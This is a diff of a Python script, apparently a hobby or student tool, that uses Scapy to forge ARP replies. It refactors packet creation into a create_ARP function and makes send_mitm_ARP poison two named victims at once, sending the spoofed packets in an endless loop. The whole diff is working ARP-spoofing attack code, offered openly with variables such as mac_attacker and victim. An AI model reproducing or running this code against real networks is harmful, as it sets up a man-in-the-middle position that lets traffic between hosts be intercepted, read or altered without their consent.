@@ -19,28 +19,40 @@ class Address:
         self.ip = ip
         self.interface = interface
 
-def send_ARP(interface, mac_attacker, victim, destination):
+def create_ARP(interface, mac_attacker, victim, destination):
     arp= Ether() / ARP()
     arp[Ether].src = mac_attacker
     arp[ARP].hwsrc = mac_attacker
     arp[ARP].psrc = destination.ip
     arp[ARP].hwdst = victim.mac
     arp[ARP].pdst = victim.ip
+    
+    return arp
 
-    sendp(arp, iface=interface, loop=1, inter=30)
+def send_ARP(interface, mac_attacker, victim, destination):
+
+    arp = create_ARP(interface, mac_attacker, victim, destination)
+
+    '''arp= Ether() / ARP()
+    arp[Ether].src = mac_attacker
+    arp[ARP].hwsrc = mac_attacker
+    arp[ARP].psrc = destination.ip
+    arp[ARP].hwdst = victim.mac
+    arp[ARP].pdst = victim.ip'''
+
+    sendp(arp, iface=interface, loop=1, inter=30, multi=True)
 
 def send_mitm_ARP(interface, mac_attacker, victim1, victim2):
-    send_ARP(interface, mac_attacker, victim1, victim2)
-    send_ARP(interface, mac_attacker, victim2, victim1)
 
-    """ arp1= Ether() / ARP()
+    arp1 = create_ARP(interface, mac_attacker, victim1, victim2)
+    arp2 = create_ARP(interface, mac_attacker, victim2, victim1)
+    
+    '''arp1= Ether() / ARP()
     arp1[Ether].src = mac_attacker
     arp1[ARP].hwsrc = mac_attacker
     arp1[ARP].psrc = victim2.ip
     arp1[ARP].hwdst = victim1.mac
     arp1[ARP].pdst = victim1.ip
-
-    sendp(arp1, iface=interface, loop=1, inter=30)
 
     arp2= Ether() / ARP()
     arp2[Ether].src = mac_attacker
@@ -48,8 +60,8 @@ def send_mitm_ARP(interface, mac_attacker, victim1, victim2):
     arp2[ARP].psrc = victim1.ip
     arp2[ARP].hwdst = victim2.mac
     arp2[ARP].pdst = victim2.ip
-
-    sendp(arp2, iface=interface, loop=1, inter=30) """
+'''
+    sendp([arp1, arp2], iface=interface, loop=1, inter=15)
 
 
 def print_menu(scan_list):
